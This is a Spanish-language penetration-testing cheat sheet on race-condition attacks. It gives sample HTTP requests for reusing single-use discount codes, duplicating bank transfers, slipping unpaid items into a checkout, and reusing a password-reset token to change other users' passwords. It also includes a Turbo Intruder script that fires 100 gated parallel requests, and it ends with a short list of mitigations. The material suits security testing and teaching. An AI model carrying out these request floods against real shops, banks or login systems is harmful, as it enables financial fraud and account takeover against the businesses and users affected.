# 🎑 Real World Payloads

## Race Conditions

### Sobrepasar Límites de Uso

#### Ejemplo: Código de Descuento de Un Solo Uso

**Solicitud Normal**

```http
POST /apply-discount HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "discount_code": "DISCOUNT20",
  "order_id": "1234"
}
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Discount applied successfully",
  "discount": "20%"
}
```

**Explotación: Envío de Solicitudes Paralelas**

* Usa herramientas como **Burp Intruder** o **Turbo Intruder**.
* Envía múltiples solicitudes simultáneamente con el mismo código de descuento.

**Resultado Esperado**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Discount applied successfully",
  "discount": "20%"
}
```

* El descuento se aplica varias veces.

***

### Multiplicación de Saldos

#### Ejemplo: Transferencia Bancaria

**Solicitud Normal**

```http
POST /transfer HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "amount": 100,
  "from_account": "1234",
  "to_account": "5678"
}
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Transfer successful",
  "remaining_balance": 900
}
```

**Explotación**

* Intercepta la solicitud de transferencia.
* Usa herramientas para enviarla múltiples veces simultáneamente.

**Resultado Esperado**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Transfer successful",
  "remaining_balance": 900
}
```

* El saldo de la cuenta original no disminuye correctamente.

***

### Condiciones de Carrera Multi-Punto

#### Ejemplo: Añadir Productos al Carrito Durante el Pago

**Flujo Normal**

1.  **Añadir producto al carrito:**

    ```http
    POST /cart/add HTTP/1.1
    Host: target.com
    Content-Type: application/json

    {
      "product_id": "123",
      "quantity": 1
    }
    ```
2.  **Realizar pago:**

    ```http
    POST /checkout HTTP/1.1
    Host: target.com
    Content-Type: application/json

    {
      "cart_id": "456",
      "payment_method": "credit_card"
    }
    ```

**Explotación**

* Envía solicitudes simultáneas para agregar productos al carrito y confirmar el pago.

**Resultado Esperado**

* El pedido final contiene productos adicionales no autorizados.

***

### Restablecimiento de Contraseña

#### Explotación de Solicitudes Simultáneas

**Solicitud Normal**

```http
POST /reset-password HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "victim",
  "reset_token": "1234"
}
```

**Explotación**

* Envía múltiples solicitudes con diferentes nombres de usuario pero el mismo token.

**Resultado Esperado**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Password reset successful"
}
```

* El token se reutiliza para cambiar la contraseña de otros usuarios.

***

### Herramientas y Técnicas

#### Burp Suite Turbo Intruder

**Script de Ejemplo**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    for i in range(100):
        engine.queue(target.req, gate='1')
    
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**Uso**

* Configura el script en Turbo Intruder.
* Ejecuta las solicitudes simultáneamente para aprovechar la ventana de carrera.

***

### Mitigaciones

1. **Bloqueo de Transacciones:** Asegúrate de que las operaciones críticas sean atómicas.
2. **Control de Concurrencia:** Implementa un sistema de bloqueo a nivel de base de datos.
3. **Límites de Tasa:** Restringe la cantidad de solicitudes por usuario.
4. **Validación Secuencial:** Usa un token único para cada operación.

***
